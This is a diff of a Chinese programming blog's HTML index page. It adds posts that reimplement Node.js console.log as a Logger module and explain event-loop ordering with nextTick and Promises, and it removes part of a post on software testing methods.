+<li><p>文件(Files): Windows和POSIX平台下都是同步</p>
+</li>
+<li><p>终端(TTYs): 在Windows平台下同步，在POSIX平台下异步</p>
+</li>
+<li><p>管道(Pipes): 在Windows平台下同步，在POSIX平台下异步</p>
+</li>
+</ul>
+<h3 id="实现一个console-log"><a href="#实现一个console-log" class="headerlink" title="实现一个console.log"></a>实现一个console.log</h3><p>实现console.log在控制台打印，利用process.stdout将输入流数据输出到输出流(即输出到终端)，一个简单的例子输出hello world ， process.stdout.write(‘hello world!’ + ‘\n’); ，以下例子是对console源码解读实现，将Console取名为Logger。</p>
+<h4 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h4><ol>
+<li>初始化Logger对象</li>
+<li>对参数进行检验，当前对象是否为Logger实例，是否为一个可写流实例</li>
+<li>为Logger对象定义_stdout，_stderr等属性</li>
+<li>将原型方法上的属性绑定到Logger实例上</li>
+<li>实现log、error、warning、trace、clear等方法</li>
+</ol>
+<h4 id="创建logger-js文件"><a href="#创建logger-js文件" class="headerlink" title="创建logger.js文件"></a>创建logger.js文件</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化Logger对象</span></span><br><span class="line"><span class="comment"> * @param &#123;*&#125; stdout </span></span><br><span class="line"><span class="comment"> * @param &#123;*&#125; stderr </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Logger</span>(<span class="params">stdout, stderr</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// step1 检查当前对象是否为Logger实例</span></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="keyword">this</span> <span class="keyword">instanceof</span> Logger))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Logger(stdout, stderr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查是否是一个可写流实例</span></span><br><span class="line">    <span class="keyword">if</span>(!stdout || !(stdout.write <span class="keyword">instanceof</span> <span class="built_in">Function</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Logger expects a writable stream instance'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果stderr未指定，使用stdout</span></span><br><span class="line">    <span class="keyword">if</span>(!stderr)&#123;</span><br><span class="line">        stderr = stdout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置js Object的属性</span></span><br><span class="line">    <span class="keyword">let</span> props = &#123;</span><br><span class="line">        writable: <span class="literal">true</span>, <span class="comment">// 对象属性是否可修改,flase为不可修改，默认值为true</span></span><br><span class="line">        enumerable: <span class="literal">false</span>, <span class="comment">// 对象属性是否可通过for-in循环，flase为不可循环，默认值为true</span></span><br><span class="line">        configurable: <span class="literal">false</span>, <span class="comment">// 能否使用delete、能否需改属性特性、或能否修改访问器属性、，false为不可重新定义，默认值为true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Logger对象定义_stdout属性</span></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(<span class="keyword">this</span>, <span class="string">'_stdout'</span>, <span class="built_in">Object</span>.assign(props, &#123;</span><br><span class="line">        value: stdout,</span><br><span class="line">    &#125;));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Logger对象定义_stderr属性</span></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(<span class="keyword">this</span>, <span class="string">'_stderr'</span>, <span class="built_in">Object</span>.assign(props, &#123;</span><br><span class="line">        value: stderr,</span><br><span class="line">    &#125;));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Logger对象定义_times属性</span></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(<span class="keyword">this</span>, <span class="string">'_times'</span>, <span class="built_in">Object</span>.assign(props, &#123;</span><br><span class="line">        value: <span class="keyword">new</span> <span class="built_in">Map</span>(),</span><br><span class="line">    &#125;));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将原型方法上的属性绑定到Logger实例上</span></span><br><span class="line">    <span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(Logger.prototype);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> k <span class="keyword">in</span> keys)&#123;</span><br><span class="line">        <span class="keyword">this</span>[keys[k]] = <span class="keyword">this</span>[keys[k]].bind(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义原型Logger的log方法</span></span><br><span class="line">Logger.prototype.log = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>._stdout.write(util.format.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>) + <span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Logger.prototype.info = Logger.prototype.log;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义原型Logger的warn方法</span></span><br><span class="line">Logger.prototype.warn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>._stderr.write(util.format.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>) + <span class="string">`\n`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Logger.prototype.error = Logger.prototype.warn;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回当前调用堆栈信息</span></span><br><span class="line">Logger.prototype.trace = <span class="function"><span class="keyword">function</span> <span class="title">trace</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> err = &#123;</span><br><span class="line">        name: <span class="string">'Trace'</span>,</span><br><span class="line">        message: util.format.apply(<span class="literal">null</span>, args)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 源自V8引擎的Stack Trace API https://github.com/v8/v8/wiki/Stack-Trace-API</span></span><br><span class="line">    <span class="built_in">Error</span>.captureStackTrace(err, trace);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.error(err.stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除控制台信息</span></span><br><span class="line">Logger.prototype.clear = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果stdout输出是一个控制台，进行clear 否则不进行处理</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>._stdout.isTTY)&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; cursorTo, clearScreenDown &#125; = <span class="built_in">require</span>(<span class="string">'readline'</span>);</span><br><span class="line">        cursorTo(<span class="keyword">this</span>._stdout, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 移动光标到给定的 TTY stream 中指定的位置。</span></span><br><span class="line">        clearScreenDown(<span class="keyword">this</span>._stdout); <span class="comment">// 方法会从光标的当前位置向下清除给定的 TTY 流</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接输出某个对象</span></span><br><span class="line">Logger.prototype.dir = <span class="function"><span class="keyword">function</span>(<span class="params">object, options</span>)</span>&#123;</span><br><span class="line">    options = <span class="built_in">Object</span>.assign(&#123; <span class="attr">customInspect</span>: <span class="literal">false</span> &#125;, options);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * util.inspect(object,[showHidden],[depth],[colors])是一个将任意对象转换为字符串的方法，通常用于调试和错误的输出。</span></span><br><span class="line"><span class="comment">     * showhidden - 是一个可选参数，如果值为true，将会输出更多隐藏信息。</span></span><br><span class="line"><span class="comment">     * depth - 表示最大递归的层数。如果对象很复杂，可以指定层数控制输出信息的多少。</span></span><br><span class="line"><span class="comment">     * 如果不指定depth,默认会递归3层，指定为null表示不限递归层数完整遍历对象。</span></span><br><span class="line"><span class="comment">     * 如果color = true，输出格式将会以ansi颜色编码，通常用于在终端显示更漂亮的效果。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">this</span>._stdout.write(util.inspect(object, options) + <span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计时器开始时间</span></span><br><span class="line">Logger.prototype.time = <span class="function"><span class="keyword">function</span>(<span class="params">label</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// process.hrtime()方法返回当前时间以[seconds, nanoseconds] tuple Array表示的高精度解析值， nanoseconds是当前时间无法使用秒的精度表示的剩余部分。</span></span><br><span class="line">    <span class="keyword">this</span>._times.set(label, process.hrtime())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计时器结束时间</span></span><br><span class="line">Logger.prototype.timeEnd = <span class="function"><span class="keyword">function</span>(<span class="params">label</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> time = <span class="keyword">this</span>._times.get(label);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!time) &#123;</span><br><span class="line">        process.emitWarning(<span class="string">`No such label '<span class="subst">$&#123;label&#125;</span>' for console.timeEnd()`</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> duration = process.hrtime(time);</span><br><span class="line">    <span class="keyword">const</span> ms = duration[<span class="number">0</span>] * <span class="number">1000</span> + duration[<span class="number">1</span>] / <span class="number">1e6</span>; <span class="comment">// 1e6 = 1000000.0 1e6表示1*10^6</span></span><br><span class="line">    <span class="keyword">this</span>.log(<span class="string">'%s: %sms'</span>, label, ms.toFixed(<span class="number">3</span>));</span><br><span class="line">    <span class="keyword">this</span>._times.delete(label);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">new</span> Logger(process.stdout, process.stderr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports.Logger = Logger;</span><br></pre></td></tr></table></figure>
+<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><h4 id="基础例子"><a href="#基础例子" class="headerlink" title="基础例子"></a>基础例子</h4><p>无特殊说明，日志都是默认打印到控制台</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> logger = reuqire(<span class="string">'logger'</span>);</span><br><span class="line"></span><br><span class="line">logger.log(<span class="string">'hello world'</span>)   <span class="comment">// 普通日志打印</span></span><br><span class="line">logger.info(<span class="string">'hello world'</span>)  <span class="comment">// 等同于logger.log</span></span><br><span class="line">logger.error(<span class="string">'hello world'</span>) <span class="comment">// 错误日志打印</span></span><br><span class="line">logger.warn(<span class="string">'hello world'</span>)  <span class="comment">// 等同于logger.error</span></span><br><span class="line">logger.clear()              <span class="comment">// 清除控制台信息</span></span><br></pre></td></tr></table></figure>
+<p>将调试信息打印到本地指定文件，这里要注意版本问题，以下代码示例在nodev10.x以下版本可以，具体原因参考 <a href="https://github.com/nodejs/node/issues/21366" target="_blank" rel="noopener">TypeError: Console expects a writable stream instance</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> output = fs.createWriteStream(<span class="string">'./stdout.txt'</span>);</span><br><span class="line"><span class="keyword">const</span> errorOutput = fs.createWriteStream(<span class="string">'./stderr.txt'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; Logger &#125; = <span class="built_in">require</span>(<span class="string">'./logger'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logger = Logger(output, errorOutput);</span><br><span class="line"></span><br><span class="line">logger.info(<span class="string">'hello world!'</span>); <span class="comment">// 内容输出到stdout.txt文件</span></span><br><span class="line">logger.error(<span class="string">'错误日志记录'</span>); <span class="comment">// 内容输出到stderr.txt文件</span></span><br></pre></td></tr></table></figure>
+<h4 id="trace打印错误堆栈"><a href="#trace打印错误堆栈" class="headerlink" title="trace打印错误堆栈"></a>trace打印错误堆栈</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.trace(<span class="string">'测试错误'</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Trace: 测试错误</span><br><span class="line">    at Object.&lt;anonymous&gt; (/Users/qufei/Documents/mycode/Summarize/test/console-test.js:7:8)</span><br><span class="line">    at Module._compile (module.js:624:30)</span><br><span class="line">    at Object.Module._extensions..js (module.js:635:10)</span><br><span class="line">    at Module.load (module.js:545:32)</span><br><span class="line">    at tryModuleLoad (module.js:508:12)</span><br><span class="line">    at Function.Module._load (module.js:500:3)</span><br><span class="line">    at Function.Module.runMain (module.js:665:10)</span><br><span class="line">    at startup (bootstrap_node.js:201:16)</span><br><span class="line">    at bootstrap_node.js:626:3</span><br></pre></td></tr></table></figure>
+<h4 id="dir显示一个对象的所有属性和方法"><a href="#dir显示一个对象的所有属性和方法" class="headerlink" title="dir显示一个对象的所有属性和方法"></a>dir显示一个对象的所有属性和方法</h4><p>depth - 表示最大递归的层数。如果对象很复杂，可以指定层数控制输出信息的多少。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> family = &#123;</span><br><span class="line">    name: <span class="string">'Jack'</span>,</span><br><span class="line">    brother: &#123;</span><br><span class="line">        hobby: [<span class="string">'篮球'</span>, <span class="string">'足球'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logger.dir(family, &#123;<span class="attr">depth</span>: <span class="number">3</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123; name: 'Jack', brother: &#123; hobby: [ '篮球', '足球' ] &#125; &#125;</span></span><br></pre></td></tr></table></figure>
+<h4 id="time和timeEnd计算程序执行消耗时间"><a href="#time和timeEnd计算程序执行消耗时间" class="headerlink" title="time和timeEnd计算程序执行消耗时间"></a>time和timeEnd计算程序执行消耗时间</h4><p>logger.time 和 logger.timeEnd用来测量一个javascript脚本程序执行消耗的时间，单位是毫秒</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 启动计时器</span></span><br><span class="line">logger.time(<span class="string">'计时器'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中间写一些测试代码</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; <span class="number">1000000000</span>; i++)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止计时器</span></span><br><span class="line">logger.timeEnd(<span class="string">'计时器'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计时器: 718.034ms</span></span><br></pre></td></tr></table></figure>
+<h3 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h3><p><a href="https://github.com/Q-Angelo/summarize/blob/master/node/console.md" target="_blank" rel="noopener">https://github.com/Q-Angelo/summarize/blob/master/node/console.md</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-01-25T14:16:53.000Z"><a href="/2018/01/25/Node.js_事件/事件循环机制-实例/">2018-01-25</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/01/25/Node.js_事件/事件循环机制-实例/">事件循环机制-实例</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>在node服务器端运行以下代码会出现什么输出结果？</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'setTimeout'</span>);</span><br><span class="line">    process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'nextTick1'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'main1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello! '</span>);</span><br><span class="line">    process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'nextTick2'</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>)</span>&#123;</span><br><span class="line">    process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'nextTick3'</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise 1'</span>);</span><br><span class="line">    resolve(<span class="string">'promise then'</span>)</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'main2'</span>);</span><br><span class="line"></span><br><span class="line">process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'nextTick4'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">say();</span><br></pre></td></tr></table></figure>
+<p>下面就结合这个原理图，根据问题，来一步一步分析：<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/micro_macro_180703" alt=""></p>
+<p>也可参考下图：<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/runtime_180703.png" alt=""></p>
+<p>我们经常会听到引擎和runtime，它们的区别是什么呢？</p>
+<ul>
+<li>引擎：解释并编译代码，让它变成能交给机器运行的代码（runnable commands）。</li>
+<li>runtime：就是运行环境，它提供一些对外接口供Js调用，以跟外界打交道。不同的runtime，会提供不同的接口，比如，在 Node.js 环境中，我们可以通过 <code>require</code> 来引入模块；而在浏览器中，我们有 <code>window</code>、 DOM。</li>
+</ul>
+<p>Js引擎是单线程的，如上图中，它负责维护任务队列，并通过 Event Loop 的机制，按顺序把任务放入栈中执行。而图中的异步处理模块，就是 runtime 提供的，拥有和Js引擎互不干扰的线程。</p>
+<h3 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h3><p>Js 中，有两类任务队列：宏任务队列（macro tasks）和微任务队列（micro tasks）。宏任务队列可以有多个，微任务队列只有<strong>一个</strong>。那么什么任务，会分到哪个队列呢？</p>
+<ul>
+<li>宏任务：script（全局任务）, setTimeout, setInterval, setImmediate, I/O, UI rendering.</li>
+<li>微任务：process.nextTick, Promise, Object.observer, MutationObserver.</li>
+</ul>
+<p>我们上面讲到，当stack空的时候，就会从任务队列中，取任务来执行。共分3步：</p>
+<ol>
+<li>取一个宏任务来执行。执行完毕后，下一步。</li>
+<li>取一个微任务来执行，执行完毕后，再取一个微任务来执行。直到微任务队列为空，执行下一步。</li>
+</ol>
+<p>从执行步骤来看，我们发现微任务，受到了特殊待遇！我们代码开始执行都是从script（全局任务）开始，所以，一旦我们的全局任务（属于宏任务）执行完，就马上执行完整个微任务队列。</p>
+<p>我们代码的开始执行都是从script（全局任务）开始，这个全局任务属于宏任务；代码由上向下执行；</p>
+<p>第1行，遇到了一个timer异步任务，属于宏任务，放入宏任务队列；</p>
+<p>第8行，遇到log,内部没有其它函数，直接输出main1;</p>
+<p>第10行，函数的定义，不执行；</p>
+<p>第17行，遇到new Promise()，进入回调函数内部:<br>1） 遇到promise.nextTick,属于微任务，放入微任务队列nextTick3;<br>2） 遇到log,内部没有其它函数，直接输出promise 1;<br>3） 遇到resolve回调，属于微任务，放入微任务队列promise then;</p>
+<p>第27行，遇到log,内部没有其它函数，直接输出main2;</p>
+<p>第29行，遇到promise.nextTick,属于微任务，放入微任务队列nextTick4;</p>
+<p>第33行，执行say()：<br>1）遇到log,内部没有其它函数，直接输出hello;<br>2）遇到promise.nextTick,属于微任务，放入微任务队列nextTick2;<br>到此为止，我们已经做了如下事情：<br>1）宏任务队列中放入了一个timer函数；<br>2）输出了main1，promise 1，main2，hello1；<br>3）微任务队列中已经放入了promise then,nextTick3,nextTick4,nextTick2;</p>
+<p>此时，我们的全局任务已执行完成了，就要马上执行完整个微任务队列。但是在微任务中，process.nextTick 是一个特殊的任务，它会被直接插入到微任务的队首（当然了，多个process.nextTick 之间也是先入先出的），优先级最高。所以，依次输出nextTick3,nextTick4,nextTick2,promise then</p>
+<p>这时，执行栈为空了，可是别忘了，我们的宏任务队列还放者一个timer函数待执行，进入timer函数：<br>1）遇到log,内部没有其它函数，直接输出setTimeout;<br>2）遇到promise.nextTick,属于微任务，放入微任务队列nextTick1;</p>
+<p>这个timer宏任务也执行完了，就马上执行完整个微任务队列，微任务队列目前只有一个任务，直接输出nextTick1；</p>
+<p>这时，执行栈又为空了，还有其它任务吗? 没有了，大功告成；</p>
+<p>以上的这种当函数执行栈为空，从任务队列中去一个任务来执行。再次为空，再取一个任务来执行，如此循环，这就是Event Loop，事件循环机制；</p>
+<p>参考：</p>
+<p><a href="https://juejin.im/post/5a63470bf265da3e2c383068" target="_blank" rel="noopener">https://juejin.im/post/5a63470bf265da3e2c383068</a></p>
+<p><a href="https://segmentfault.com/a/1190000011198232" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011198232</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
         <time datetime="2017-12-05T14:16:53.000Z"><a href="/2017/12/05/Node.js_事件/理解事件循环机制/">2017-12-05</a></time>
       
       
@@ -673,488 +1043,6 @@
 
 
 
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2017-06-05T06:45:23.000Z"><a href="/2017/06/05/Node.js_测试/Node.js单元测试、集成测试、基准测试以及代码覆盖率测试/">2017-06-05</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2017/06/05/Node.js_测试/Node.js单元测试、集成测试、基准测试以及代码覆盖率测试/">Node.js单元测试、集成测试、基准测试以及代码覆盖率测试</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>黑盒测试 (Black-box Testing), 测试应用程序的功能, 而不是其内部结构或运作. 测试者不需了解代码、内部结构等, 只需知道什么是应用应该做的事, 即当键入特定的输入, 可得到一定的输出. 测试者通过选择<code>有效输入</code>和<code>无效输入</code>来验证是否正确的输出. 此测试方法可适合大部分的软件测试, 例如集成测试 (Integration Testing) 以及系统测试 (System Testing).</p>
-<h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>白盒测试 (White-box Testing) 测试应用程序的内部结构或运作, 而不是测试应用程序的功能 (即黑盒测试). 在白盒测试时, 以编程语言的角度来设计测试案例. 白盒测试可以应用于单元测试 (Unit Testing)、集成测试 (Integration Testing) 和系统的软件测试流程, 可测试在集成过程中每一单元之间的路径, 或者主系统跟子系统中的测试.</p>
-<h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><p>单元测试，又称模块测试，针对程序中的最小执行单元进行正确性测试。常见的开发模式包括 TDD 和 BDD 两类。</p>
-<p>TDD（Test-driven development，测试驱动开发），先编写测试用例，然后针对测试用例开发模块，当测试用例不足时，补充测试用例；当模块无法通过测试时，持续更新模块代码，直到完全通过测试用例。其开发核心围绕测试用例展开，即测试用例的完整性决定了开发模块的健壮性和正确性，这容易由边界条件引发单元测试覆盖度不够的问题。</p>
-<p>BDD（Behavior-driven development，行为驱动开发），用语义化的编程语言开发紧贴业务需求的测试用例，继而驱动相关模块的开发。</p>
